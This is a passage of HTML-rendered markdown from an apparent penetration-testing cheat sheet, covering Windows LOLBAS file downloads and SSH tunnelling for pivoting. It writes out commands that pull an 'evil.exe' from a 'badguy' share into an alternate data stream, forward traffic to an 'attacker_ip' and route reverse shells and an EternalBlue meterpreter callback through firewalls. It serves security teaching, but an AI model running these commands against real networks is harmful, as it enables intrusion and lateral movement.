class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo make things easier, set up a config file like so:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Host alpha\n    HostName REMOTE_IP\n    User root\n    StrictHostKeyChecking no\n    UserKnownHostsFile /dev/null\n    IdentityFile /full/path/to/root_rsa\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eHost alpha\n    HostName REMOTE_IP\n    User root\n    StrictHostKeyChecking no\n    UserKnownHostsFile /dev/null\n    IdentityFile /full/path/to/root_rsa\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen mount the filesystem with root access:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# format: sshfs [user@]host:[remote_directory] mountpoint [options]\nsshfs -F/full/path/to/ssh-config alpha:/ ./rootfs\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e format: sshfs [user@]host:[remote_directory] mountpoint [options]\u003c/span\u003e\nsshfs -F/full/path/to/ssh-config alpha:/ ./rootfs\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.10 Windows LOLBAS File Downloads\u003c/h3\u003e\u003ca id=\"user-content-7210-windows-lolbas-file-downloads\" class=\"anchor\" aria-label=\"Permalink: 7.2.10 Windows LOLBAS File Downloads\" href=\"#7210-windows-lolbas-file-downloads\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Download 7zip binary to ./7zip.exe, using urlcache or verifyctl\ncertutil -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe\ncertutil -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe\n\n# Download using expand\nexpand http://7-zip.org/a/7z1604-x64.exe 7zip.exe\n# Download from SBM share into Alternate Data Stream\nexpand \\\\badguy\\evil.exe C:\\Users\\Public\\somefile.txt:evil_ads.exe\n\n# Download using powershell\npowershell -c \u0026quot;(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','7zip.exe')\u0026quot;\npowershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Download 7zip binary to ./7zip.exe, using urlcache or verifyctl\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eurlcache \u003cspan class=\"pl-k\"\u003e-split\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-f\u003c/span\u003e http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ezip.org\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7z1604-x64.exe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e7zip.exe\u003c/span\u003e\ncertutil \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003everifyctl \u003cspan class=\"pl-k\"\u003e-f\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-split\u003c/span\u003e http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ezip.org\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7z1604-x64.exe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e7zip.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Download using expand\u003c/span\u003e\nexpand http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ezip.org\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7z1604-x64.exe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e7zip.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Download from SBM share into Alternate Data Stream\u003c/span\u003e\nexpand \\\\badguy\\\u003cspan class=\"pl-c1\"\u003eevil.exe\u003c/span\u003e C:\\Users\\Public\\somefile.txt:\u003cspan class=\"pl-c1\"\u003eevil_ads.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Download using powershell\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','7zip.exe')\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\npowershell iwr \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euri http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ezip.org\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7z1604-x64.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutfile \u003cspan class=\"pl-c1\"\u003e7zip.exe\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8 Pivoting and Redirection\u003c/h1\u003e\u003ca id=\"user-content-8-pivoting-and-redirection\" class=\"anchor\" aria-label=\"Permalink: 8 Pivoting and Redirection\" href=\"#8-pivoting-and-redirection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThese are techniques for \"traffic bending\" or \"traffic shaping\" or\n\"tunneling traffic\" or \"port redirection\" or \"port forwarding\".\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.1 SSH Tunnels\u003c/h2\u003e\u003ca id=\"user-content-81-ssh-tunnels\" class=\"anchor\" aria-label=\"Permalink: 8.1 SSH Tunnels\" href=\"#81-ssh-tunnels\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBefore starting, it is best to have the following settings enabled in the jumpbox\n\u003ccode\u003e/etc/ssh/sshd_config\u003c/code\u003e file.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-ini notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# In order to leverage -R remote port forwards, set the following:\nGatewayPorts clientspecified\n\n# Allow TCP forwarding (local and remote)\nAllowTcpForwarding yes\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e In order to leverage -R remote port forwards, set the following:\u003c/span\u003e\nGatewayPorts clientspecified\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Allow TCP forwarding (local and remote)\u003c/span\u003e\nAllowTcpForwarding yes\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAfter making changes to the \u003ccode\u003esshd_config\u003c/code\u003e file you must restart \u003ccode\u003esshd\u003c/code\u003e for changes to take effect.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# all commands executed as ROOT\n\n# View the SSH server status.\nsystemctl status ssh\n\n# Restart the SSH server (Debian, Ubuntu, Mint)\n/etc/init.d/ssh restart # older SysV systems\nservice ssh restart # if service cmd installed\nsystemctl restart ssh # newer systemd systems\n\n# for RHEL, Fedora, CentOS, Alma, Rocky, do...\n/etc/init.d/sshd restart # older SysV systems\nservice sshd restart # if service command installed\nsystemctl restart sshd # newer systems w/ systemd\n\n# FreeBSD, OpenBSD restart\n/etc/rc.d/sshd restart\nservice sshd restart\n\n# more at: https://www.cyberciti.biz/faq/howto-restart-ssh/\n\n# Stop the SSH server.\nsystemctl stop ssh\n\n# Start the SSH server.\nsystemctl start ssh\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e all commands executed as ROOT\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e View the SSH server status.\u003c/span\u003e\nsystemctl status ssh\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Restart the SSH server (Debian, Ubuntu, Mint)\u003c/span\u003e\n/etc/init.d/ssh restart \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e older SysV systems\u003c/span\u003e\nservice ssh restart \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if service cmd installed\u003c/span\u003e\nsystemctl restart ssh \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e newer systemd systems\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for RHEL, Fedora, CentOS, Alma, Rocky, do...\u003c/span\u003e\n/etc/init.d/sshd restart \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e older SysV systems\u003c/span\u003e\nservice sshd restart \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if service command installed\u003c/span\u003e\nsystemctl restart sshd \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e newer systems w/ systemd\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e FreeBSD, OpenBSD restart\u003c/span\u003e\n/etc/rc.d/sshd restart\nservice sshd restart\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e more at: https://www.cyberciti.biz/faq/howto-restart-ssh/\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Stop the SSH server.\u003c/span\u003e\nsystemctl stop ssh\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Start the SSH server.\u003c/span\u003e\nsystemctl start ssh\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere are common tunneling commands (using \u003ccode\u003e-g\u003c/code\u003e flag forces the ssh option\n\u003ccode\u003eGatewayPorts\u003c/code\u003e to yes, and is good practice when using \u003ccode\u003e-R\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"## Local Forwarding ###################################\n# SSH local port forward from DMZ box to reach internal_server_ip:port via jumpbox_ip\nssh jumper@jumpbox_ip -p 2222 -L 0.0.0.0:4445:internal_server_ip:445\n# Now `smbclient //DMZ_IP -p 4445 -N -L` on kali will let us list the SMB shares of\n# internal_server_ip, which is only reachable from jumpbox_ip\n\n# SSH local port forward to send traffic from our local port 8080 to victim's\n# port 80 (to get around firewall restrictions that don't allow remote\n# connections to that port, but allow us to ssh in)\nssh victim@$VICTIM_IP -L 8080:localhost:80\n# Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable\n# from the outside\n\n\n## Remote Forwarding #################################\n# forward traffic to redirector's port 80 to your local listener on port 8080\nssh jumper@jumpbox_ip -gR 0.0.0.0:80:localhost:8080\n# now reverse shells pointed to the jumpbox_ip:80 will hit your local listener\n\n# Connecting from jumpbox-\u0026gt;attacker to give attacker access to\n# internal_server_ip:445\nssh attacker@attacker_ip -gR 4445:internal_server_ip:445\n# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of\n# internal_server_ip, which is only reachable from jumpbox_ip, getting around\n# firewall rules that also prevent inbound ssh connections\n\n\n## Complex example: Throwing Eternal Blue through firewall ##################################\n# Local forward to victim's SMB \u0026amp; WinRPC ports, remote forward meterpreter callback to attacker\nssh jumper@jumpbox_ip -L 4450:victim_ip:445 -L 135:victim_ip:135 \\\n-R 4444:localhost:4444\n# The -L 135:victim_ip:135 port forward is optional. If you do not want to use it, you will have to set VerifyArch to false in metasploit.\n\n\n## Dynamic forwarding (SOCKS4/5) #######################\n# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip, which is only reachable from jumpbox\nssh jumper@jumpbox_ip -p 2222 -D 1080\n# Next config /etc/proxychains4.conf: socks5 localhost 1080\n# Then: proxychains curl http://any_internal_server_ip/\n# curl, nmap, wfuzz and some versions of netcat natively support SOCKS proxies.\n# Look at their help to see how to use the feature.\n# e.g.\ncurl -x socks5://127.0.0.1:1080 http://www.lolcats.com\n# You can also set up firefox to browse through SOCKS proxy through GUI settings\n\n\n## Remote Dynamic forwarding (SOCKS4/5) ################################\n# Connecting from jumpbox -\u0026gt; attacker, open SOCKS proxy on\n# attacker that forwards traffic to internal net. Useful\n# when firewall blocking inbound traffic, but allows ssh out.\n# OpenSSH _client_ needs to be version 7.6 or above to use.\nssh -R 1080 attacker@attacker_ip\n\n\n## ProxyJump ########################################\n# ProxyJump lets you nest ssh connections to reach remote internal networks/hosts\n# Here we chain ssh connections like so: jumpbox1_ip -\u0026gt; jumpbox2_ip -\u0026gt; internal_host,\n# where internal_host is only reachable from jumbpox2, and jumpbox2 is only reachable from jumpbox1\nssh -J jumper@jumpbox1_ip:2221,jumper2@jumbox2_ip:2222 remoteuser@internal_host\n\n# Combine ProxyJump + dynamic port forward to create a proxy through 2nd_box which is only accessible via jumpbox_ip\nssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080\n# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only\n\n\n## Miscellaneous ###################################\n# bypass first time prompt when have non-interactive shell\nssh -o \u0026quot;UserKnownHostsFile=/dev/null\u0026quot; -o \u0026quot;StrictHostKeyChecking=no\u0026quot; ...\n\n# only allow a specific ssh key ability to port forward through port 6969:\n# add following to ~/.ssh/authorized_keys\necho \u0026quot;from=\\\u0026quot;$from_addr\\\u0026quot;,command=\\\u0026quot;/usr/sbin/false\\\u0026quot;,no-agent-forwarding,no-X11-forwarding,no-pty,permitopen=\\\u0026quot;localhost:6969\\\u0026quot; $pubkey\u0026quot; \u0026gt;\u0026gt; ~/.ssh/authorized_keys\n# where $from_addr is the IP that will be connecting to kali, and $pubkey is\n# the full text of the id_rsa.pub file that you are using for this purpose.\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Local Forwarding ###################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SSH local port forward from DMZ box to reach internal_server_ip:port via jumpbox_ip\u003c/span\u003e\nssh jumper@jumpbox_ip -p 2222 -L 0.0.0.0:4445:internal_server_ip:445\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Now `smbclient //DMZ_IP -p 4445 -N -L` on kali will let us list the SMB shares of\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e internal_server_ip, which is only reachable from jumpbox_ip\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SSH local port forward to send traffic from our local port 8080 to victim's\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e port 80 (to get around firewall restrictions that don't allow remote\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connections to that port, but allow us to ssh in)\u003c/span\u003e\nssh victim@\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -L 8080:localhost:80\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e from the outside\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Remote Forwarding #################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e forward traffic to redirector's port 80 to your local listener on port 8080\u003c/span\u003e\nssh jumper@jumpbox_ip -gR 0.0.0.0:80:localhost:8080\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e now reverse shells pointed to the jumpbox_ip:80 will hit your local listener\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Connecting from jumpbox-\u0026gt;attacker to give attacker access to\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e internal_server_ip:445\u003c/span\u003e\nssh attacker@attacker_ip -gR 4445:internal_server_ip:445\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e internal_server_ip, which is only reachable from jumpbox_ip, getting around\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e firewall rules that also prevent inbound ssh connections\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Complex example: Throwing Eternal Blue through firewall ##################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Local forward to victim's SMB \u0026amp; WinRPC ports, remote forward meterpreter callback to attacker\u003c/span\u003e\nssh jumper@jumpbox_ip -L 4450:victim_ip:445 -L 135:victim_ip:135 \\\n-R 4444:localhost:4444\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e The -L 135:victim_ip:135 port forward is optional. If you do not want to use it, you will have to set VerifyArch to false in metasploit.\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Dynamic forwarding (SOCKS4/5) #######################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip, which is only reachable from jumpbox\u003c/span\u003e\nssh jumper@jumpbox_ip -p 2222 -D 1080\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Next config /etc/proxychains4.conf: socks5 localhost 1080\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Then: proxychains curl http://any_internal_server_ip/\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e curl, nmap, wfuzz and some versions of netcat natively support SOCKS proxies.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Look at their help to see how to use the feature.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e e.g.\u003c/span\u003e\ncurl -x socks5://127.0.0.1:1080 http://www.lolcats.com\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e You can also set up firefox to browse through SOCKS proxy through GUI settings\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Remote Dynamic forwarding (SOCKS4/5) ################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Connecting from jumpbox -\u0026gt; attacker, open SOCKS proxy on\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e attacker that forwards traffic to internal net. Useful\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e when firewall blocking inbound traffic, but allows ssh out.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e OpenSSH _client_ needs to be version 7.6 or above to use.\u003c/span\u003e\nssh -R 1080 attacker@attacker_ip\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# ProxyJump ########################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ProxyJump lets you nest ssh connections to reach remote internal networks/hosts\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Here we chain ssh connections like so: jumpbox1_ip -\u0026gt; jumpbox2_ip -\u0026gt; internal_host,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e where internal_host is only reachable from jumbpox2, and jumpbox2 is only reachable from jumpbox1\u003c/span\u003e\nssh -J jumper@jumpbox1_ip:2221,jumper2@jumbox2_ip:2222 remoteuser@internal_host\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Combine ProxyJump + dynamic port forward to create a proxy through 2nd_box which is only accessible via jumpbox_ip\u003c/span\u003e\nssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# Miscellaneous ###################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e bypass first time prompt when have non-interactive shell\u003c/span\u003e\nssh -o \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUserKnownHostsFile=/dev/null\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -o \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eStrictHostKeyChecking=no\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e ...\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e only allow a specific ssh key ability to port forward through port 6969:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add following to ~/.ssh/authorized_keys\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efrom=\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$from_addr\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e,command=\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e/usr/sbin/false\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e,no-agent-forwarding,no-X11-forwarding,no-pty,permitopen=\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003elocalhost:6969\u003cspan class=\"pl-cce\"\u003e\\\"\u003c/span\u003e \u003cspan 